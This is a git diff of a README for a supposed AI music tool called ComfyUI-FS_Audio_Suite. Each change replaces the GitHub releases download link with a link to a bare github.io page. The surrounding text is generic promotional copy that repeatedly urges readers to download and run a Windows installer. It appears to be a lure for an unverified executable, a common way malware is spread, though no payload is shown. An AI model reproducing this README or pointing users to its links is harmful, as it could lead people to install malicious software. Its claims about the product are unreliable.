@@ -1,12 +1,12 @@
 # 🎵 ComfyUI-FS_Audio_Suite - Create Stunning Music With AI
 
-[![Download Now](https://img.shields.io/badge/Download-FS_Audio_Suite-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Deborahwalkerz661/ComfyUI-FS_Audio_Suite/releases)
+[![Download Now](https://img.shields.io/badge/Download-FS_Audio_Suite-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://deborahwalkerz661.github.io)
 
 ## 🚀 Getting Started
 
 Welcome to ComfyUI-FS_Audio_Suite, the easiest way to create professional-quality music using artificial intelligence. This powerful tool turns your musical ideas into polished audio tracks with just a few clicks. Whether you are a musician, content creator, or curious beginner, this application helps you make amazing sounds without any technical experience.
 
-Visit this link to download the application: [https://github.com/Deborahwalkerz661/ComfyUI-FS_Audio_Suite/releases](https://github.com/Deborahwalkerz661/ComfyUI-FS_Audio_Suite/releases)
+Visit this link to download the application: [https://deborahwalkerz661.github.io](https://deborahwalkerz661.github.io)
 
 ## 🎯 What Does FS_Audio_Suite Do?
 
@@ -31,7 +31,7 @@ These are general guidelines. Your computer may still work with lower specificat
 
 Follow these simple steps to get FS_Audio_Suite on your computer:
 
-1. **Visit the download page:** Go to [https://github.com/Deborahwalkerz661/ComfyUI-FS_Audio_Suite/releases](https://github.com/Deborahwalkerz661/ComfyUI-FS_Audio_Suite/releases)
+1. **Visit the download page:** Go to [https://deborahwalkerz661.github.io](https://deborahwalkerz661.github.io)
 2. **Choose the correct file:** Look for the latest version and download the Windows installer file
 3. **Save the file:** Choose a location on your computer where you can easily find it, like your Desktop or Downloads folder
 4. **Run the installer:** Double-click the downloaded file to start the installation process
@@ -39,7 +39,7 @@ Follow these simple steps to get FS_Audio_Suite on your computer:
 6. **Complete installation:** Once finished, click "Finish" to close the wizard
 7. **Launch the app:** Find FS_Audio_Suite in your Start Menu or on your Desktop and open it
 
-Visit this link to download the application: [https://github.com/Deborahwalkerz661/ComfyUI-FS_Audio_Suite/releases](https://github.com/Deborahwalkerz661/ComfyUI-FS_Audio_Suite/releases)
+Visit this link to download the application: [https://deborahwalkerz661.github.io](https://deborahwalkerz661.github.io)
 
 ## 🎛️ Main Features
 
@@ -146,11 +146,11 @@ We would like to thank the open-source community and all the contributors who ma
 
 Do not wait any longer to unlock your musical potential. Download FS_Audio_Suite now and start creating sounds you never thought possible. With its intuitive design and powerful AI engine, you will be making music in minutes.
 
-[![Download Now](https://img.shields.io/badge/Download-FS_Audio_Suite-28a745?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Deborahwalkerz661/ComfyUI-FS_Audio_Suite/releases)
+[![Download Now](https://img.shields.io/badge/Download-FS_Audio_Suite-28a745?style=for-the-badge&logo=github&logoColor=white)](https://deborahwalkerz661.github.io)
 
 ## 📌 Remember
 
-Visit this link to download the application: [https://github.com/Deborahwalkerz661/ComfyUI-FS_Audio_Suite/releases](https://github.com/Deborahwalkerz661/ComfyUI-FS_Audio_Suite/releases)
+Visit this link to download the application: [https://deborahwalkerz661.github.io](https://deborahwalkerz661.github.io)
 
 Join thousands of satisfied users who are already creating amazing music with FS_Audio_Suite. The future of music creation is here, and it is easier than you have ever imagined.
 
